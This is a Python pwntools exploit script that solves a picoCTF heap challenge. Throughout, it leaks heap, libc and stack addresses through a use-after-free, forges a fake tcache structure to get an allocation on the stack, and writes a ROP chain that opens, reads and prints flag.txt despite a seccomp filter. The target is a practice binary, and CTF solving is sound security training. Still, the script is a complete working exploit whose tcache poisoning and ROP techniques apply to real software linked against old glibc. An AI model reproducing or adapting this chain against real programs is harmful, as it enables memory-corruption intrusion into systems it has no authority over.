#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall")
libc = ELF("./lib/libc-2.27.so")

context.binary = exe


def conn():
    global r

    if args.LOCAL:
        r = process(['./lib/ld-2.27.so', '--library-path', './lib', exe.path])
        if args.GDB:
            gdb.attach(r)
    else:
        r = remote("mars.picoctf.net", 31638)

    return r


def add_student(idx: int, is_virtual: bool):
    r.sendlineafter(b"choice: ", f"0 {idx}".encode())
    r.sendlineafter(b"virtual (0/1)?", b"1" if is_virtual else b"0")


def set_name(index: int, data: bytes):
    r.sendlineafter(b"choice: ", f"1 {index}".encode())
    r.sendline(f"{len(data)}".encode())

    # Convert binary bytes into space-separated integer strings
    int_sequence = " ".join(str(b) for b in data)
    r.sendline(int_sequence.encode())


def print_name(idx: int) -> bytes:
    r.sendlineafter(b"choice: ", f"2 {idx}".encode())
    return r.recvlines(2)[-1].strip()


def do_work(idx: int):
    r.sendlineafter(b"choice: ", f"3 {idx}".encode())


def delete_student(idx: int):
    r.sendlineafter(b"choice: ", f"4 {idx}".encode())


def main():
    r = conn()

    """
     line  CODE  JT   JF      K
    =================================
     0000: 0x20 0x00 0x00 0x00000004  A = arch
     0001: 0x15 0x00 0x0a 0xc000003e  if (A != ARCH_X86_64) goto 0012
     0002: 0x20 0x00 0x00 0x00000000  A = sys_number
     0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
     0004: 0x15 0x00 0x07 0xffffffff  if (A != 0xffffffff) goto 0012
     0005: 0x15 0x05 0x00 0x00000000  if (A == read) goto 0011
     0006: 0x15 0x04 0x00 0x00000001  if (A == write) goto 0011
     0007: 0x15 0x03 0x00 0x00000002  if (A == open) goto 0011
     0008: 0x15 0x02 0x00 0x00000005  if (A == fstat) goto 0011
     0009: 0x15 0x01 0x00 0x0000003c  if (A == exit) goto 0011
     0010: 0x15 0x00 0x01 0x000000e7  if (A != exit_group) goto 0012
     0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW
     0012: 0x06 0x00 0x00 0x00000000  return KILL
    """

    add_student(0, False)
    add_student(1, False)

    # Once we'll set a name of length 0x18, the program will allocate the address
    # of this student for the name pointer, giving use the ability to manipulate it
    delete_student(0)
    
    set_name(1, b"A")
    heap = int.from_bytes(print_name(1), "little")
    heap = (heap & 0x0000FFFFFFFFF000) - 0x13000    # There is no pointer mangling in this libc version

    set_name(1, b"A" * 8 + p64(heap + 0x11f00) + p8(0x8))   # smallchunk already there :)
    libc.address = int.from_bytes(print_name(0), "little") - 0x3ebcb0

    set_name(1, b"A" * 8 + p64(libc.sym.environ) + p8(0x8))
    stack = int.from_bytes(print_name(0), "little")

    log.info(f"heap  @ 0x{heap:x}")
    log.info(f"libc  @ 0x{libc.address:x}")
    log.info(f"stack @ 0x{stack:x}")

    add_student(2, False)       # We're gonna setup this for later
    set_name(2, b"flag.txt")    # heap+0x13d30

    rop = ROP(libc)
    pop_rax = rop.find_gadget(['pop rax', 'ret'])[0]
    pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
    pop_rsi = rop.find_gadget(['pop rsi', 'ret'])[0]
    pop_rdx = rop.find_gadget(['pop rdx', 'ret'])[0]
    syscall = rop.find_gadget(['syscall', 'ret'])[0]

    # Create a fake tcache struct in which the 0x120-sized bin
    # is populated with a stack address
    fake_tcache = flat(
        p64(0x0) * 2,
        p64(0x1),
        p64(0x0) * 5,
        p64(0x0) * 16,
        p64(stack - 0x130)
    ).ljust(0x248, b"\x00")

    payload = flat(
        b"A" * 8,   # padding for saved $rbp

        # fd = open('flag.txt', RD_ONLY)
        pop_rdi,
        heap + 0x13d30,
        pop_rsi,
        0x4,
        pop_rdx,
        0x0,
        pop_rax,
        0x2,
        syscall,

        # read(fd, &buf, 0x20)
        pop_rdi,
        0x3,        # A lazy way to load the fd in a fresh new container
        pop_rsi,
        heap + 0x1000,
        pop_rdx,
        0x20,
        pop_rax,
        0x0,
        syscall,

        # write(1, &buf, 0x20)
        pop_rdi,
        0x1,
        pop_rsi,
        heap + 0x1000,
        pop_rdx,
        0x20,
        pop_rax,
        0x1,
        syscall,

        # exit(0)
        pop_rdi,
        0x0,
        pop_rax,
        0x3c,
        syscall
    ).ljust(0x118, b"\x00")

    # The program firstly frees any chunk already allocated (if any)
    # and then allocated the chunk based on our input size.
    # So we have to change the name pointer of our freed chunk to
    # the tcache so it will free it and reallocate it with our fake one
    set_name(1, b"A" * 8 + p64(heap + 0x10))
    set_name(0, fake_tcache)

    # Now we allocate our 0x120-sized chunk to the stack, precisely
    # on over the saved $rbp of "set_name" function, so we can write
    # our ROP chain (we don't care if the tcache struct is being freed
    # as we won't allocate any more chunks)
    set_name(0, payload)
    flag = r.recvlines(2)[-1].decode()
    log.success(f"Flag: {flag}")


if __name__ == "__main__":
    main()
